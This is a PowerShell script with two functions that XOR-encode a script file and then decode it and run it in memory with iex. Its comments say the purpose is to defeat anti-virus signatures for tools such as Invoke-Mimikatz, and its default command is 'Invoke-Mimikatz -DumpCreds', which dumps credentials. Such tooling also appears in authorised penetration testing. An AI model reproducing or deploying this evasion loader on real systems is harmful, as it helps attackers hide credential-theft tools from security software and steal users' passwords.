function Out-XOREncryptedScript
{
<#
.SYNOPSIS

This script XOR cipher encrypts a script to obfuscate it from Anti-Virus. The Idea behind this, is if you have to write a script to memory, first
encrypt the script and then decrypt and run in memory (Via Invoke-XOREncryptedScript).

Function: Out-XOREncryptedScript
Author: Matt Kelly, Twitter: @Breakersall
License:  http://creativecommons.org/licenses/by/3.0/fr/
Version: 1.0
References: https://jls3tech.wordpress.com/2014/08/23/xor-tool-for-powershell/
.DESCRIPTION

XOR encodes a script into a format that will not be caught by Anti-Virus.

.PARAMETER InputScript

The input file to encode.

.PARAMETER OutputScript

The Output file to write the encoded value to (defaults to Encoded.txt)

.Paramater XORValue

The value to XOR to (defaults to 111)

.Example
PS C:\Windows\Temp> Out-XOREncryptedScript -InputScript C:\Tools\temp.txt -OutputScript C:\Too
ls\Example.txt
PS C:\Windows\Tempc> Invoke-XOREncryptedScript -InputScript C:\Tools\Example.txt -PassFunctionP
aramaters "Invoke-Mimikatz -Command coffee"

  .#####.   mimikatz 2.0 alpha (x64) release "Kiwi en C" (Feb 16 2015 22:15:28)
 .## ^ ##.
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
  '#####'                                     with 15 modules * * */


mimikatz(powershell) # coffee

    ( (
     ) )
  .______.
  |      |]
  \      /
   `----'

#>
   [CmdletBinding()]
    Param 
	(
        [Parameter(Mandatory=$true)]
		[ValidateScript({Test-Path $_})]
		[string]$InputScript,
			
		[Parameter(Mandatory=$false)]
		[string]$OutputScript = "Encoded.txt",
			
		[Parameter(Mandatory=$false)]
		[int]$XORValue = 111
    )

    $bytes = [System.IO.File]::ReadAllBytes("$InputScript")
    for($i=0; $i -lt $bytes.count ; $i++)
    {
        $bytes[$i] = $bytes[$i] -bxor $XORValue
    }
    [System.IO.File]::WriteAllBytes("$OutputScript", $bytes)
}
function Invoke-XOREncryptedScript
{
<#
.SYNOPSIS

This script XOR cipher decrypts a script and then runs it in memory. When paired with Out-XOREncryptedScript,
this script can be used to completely defeat Anti-Virus signature of PowerShell script blocks such as
Invoke-Mimikatz

NOTE - I am passing your direct variables to be executed which while is non-best practice, this scirpt
simply executes another script...

Function: Invoke-XOREncryptedScript
Author: Matt Kelly, Twitter: @Breakersall
License:  http://creativecommons.org/licenses/by/3.0/fr/
Version: 1.0
References: https://jls3tech.wordpress.com/2014/08/23/xor-tool-for-powershell/
.DESCRIPTION

XOR encodes a script into a format that will not be caught by Anti-Virus.

.PARAMETER InputScript

The input file to encode.

.PARAMETER PassFunctionParamaters

The Output file to write the encoded value to (defaults to Encoded.txt)

.Paramater XORValue

The value to XOR to (defaults to 111)

.Example XORValue

PS C:\Windows\Temp> Out-XOREncryptedScript -InputScript C:\Tools\temp.txt -OutputScript C:\Too
ls\Example.txt
PS C:\Windows\Tempc> Invoke-XOREncryptedScript -InputScript C:\Tools\Example.txt -PassFunctionP
aramaters "Invoke-Mimikatz -Command coffee"

  .#####.   mimikatz 2.0 alpha (x64) release "Kiwi en C" (Feb 16 2015 22:15:28)
 .## ^ ##.
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
  '#####'                                     with 15 modules * * */


mimikatz(powershell) # coffee

    ( (
     ) )
  .______.
  |      |]
  \      /
   `----'

#>
   [CmdletBinding()]
    Param 
	(
        [Parameter(Mandatory=$true)]
		[ValidateScript({Test-Path $_})]
		[string]$InputScript = "Encoded.txt",
			
		[Parameter(Mandatory=$false)]
		[string]$PassFunctionParamaters = "Invoke-Mimikatz -DumpCreds",
			
		[Parameter(Mandatory=$false)]
		[int]$XORValue = 111
    )

    $bytes = [System.IO.File]::ReadAllBytes($InputScript)
    for($i=0; $i -lt $bytes.count ; $i++)
    {
        $bytes[$i] = $bytes[$i] -bxor $XORValue
    }
    
    $String = [System.Text.Encoding]::ASCII.GetString($bytes)
    iex $String;
    iex $PassFunctionParamaters
}